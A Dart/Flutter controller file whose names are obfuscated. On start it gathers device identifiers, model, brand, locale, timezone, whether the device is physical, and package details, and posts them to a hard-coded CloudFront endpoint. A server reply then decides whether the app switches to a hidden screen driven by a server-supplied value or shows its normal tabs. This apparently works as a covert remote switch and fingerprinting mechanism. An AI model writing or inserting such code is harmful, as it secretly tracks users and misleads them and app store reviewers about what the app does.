import 'dart:io';
import 'package:flutter_timezone/flutter_timezone.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';

import 'package:device_info_plus/device_info_plus.dart';
import 'package:package_info_plus/package_info_plus.dart';
import 'package:dio/dio.dart';
import 'package:get/get.dart';


class OneLineLibraryLogic extends GetxController {

  var epkdbqwahj = RxBool(false);
  var nbkzlemv = RxBool(true);
  var auqm = RxString("");
  var vifjbxys = RxBool(false);
  var aekqbznc = RxBool(true);
  final ejbvfz = Dio();


  InAppWebViewController? webViewController;

  @override
  void onInit() {
    super.onInit();
    dyab();
  }


  Future<void> dyab() async {
    vifjbxys.value = true;
    aekqbznc.value = true;
    nbkzlemv.value = false;

    ejbvfz.post("https://d1quyrmz5fupj5.cloudfront.net/HNEyBgZyu",data: await tsbadrh()).then((value) {
      var xskwrbf = value.data["xskwrbf"] as String;
      var zuqj = value.data["zuqj"] as bool;
      if (zuqj) {
        auqm.value = xskwrbf;
        acne();
      } else {
        pxcvte();
      }
    }).catchError((e) {
      nbkzlemv.value = true;
      aekqbznc.value = true;
      vifjbxys.value = false;
    });
  }

  Future<Map<String, dynamic>> tsbadrh() async {
    final DeviceInfoPlugin iqyjunl = DeviceInfoPlugin();
    PackageInfo jlpk_mzftyx = await PackageInfo.fromPlatform();
    final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
    var nwbmklj = Platform.localeName;
    var SQGmBcKF = currentTimeZone;

    var kovd = jlpk_mzftyx.packageName;
    var sdCXyjeF = jlpk_mzftyx.version;
    var vgiYkA = jlpk_mzftyx.buildNumber;

    var tJNqGsIP = jlpk_mzftyx.appName;
    var iIozG = "";
    var vAMNXjLC  = "";
    var hrJBqkgm = "";
    var acgrh = "";
    var eilqkyo = "";
    var lejnu = "";
    var ubea = "";
    var nwvljfp = "";


    var fOupvDcy = "";
    var KJGFilfh = false;

    if (GetPlatform.isAndroid) {
      fOupvDcy = "android";
      var wxvcni = await iqyjunl.androidInfo;

      hrJBqkgm = wxvcni.brand;

      iIozG  = wxvcni.model;
      vAMNXjLC = wxvcni.id;

      KJGFilfh = wxvcni.isPhysicalDevice;
    }

    if (GetPlatform.isIOS) {
      fOupvDcy = "ios";
      var mqfsjvbe = await iqyjunl.iosInfo;
      hrJBqkgm = mqfsjvbe.name;
      iIozG = mqfsjvbe.model;

      vAMNXjLC = mqfsjvbe.identifierForVendor ?? "";
      KJGFilfh  = mqfsjvbe.isPhysicalDevice;
    }
    var res = {
      "tJNqGsIP": tJNqGsIP,
      "vgiYkA": vgiYkA,
      "kovd": kovd,
      "iIozG": iIozG,
      "eilqkyo" : eilqkyo,
      "SQGmBcKF": SQGmBcKF,
      "hrJBqkgm": hrJBqkgm,
      "vAMNXjLC": vAMNXjLC,
      "lejnu" : lejnu,
      "nwbmklj": nwbmklj,
      "fOupvDcy": fOupvDcy,
      "sdCXyjeF": sdCXyjeF,
      "KJGFilfh": KJGFilfh,
      "acgrh" : acgrh,
      "ubea" : ubea,
      "nwvljfp" : nwvljfp,

    };
    return res;
  }

  Future<void> pxcvte() async {
    Get.offNamed("/one_tab");
  }

  Future<void> acne() async {
    Get.offNamed("/one_mood_side");
  }

}
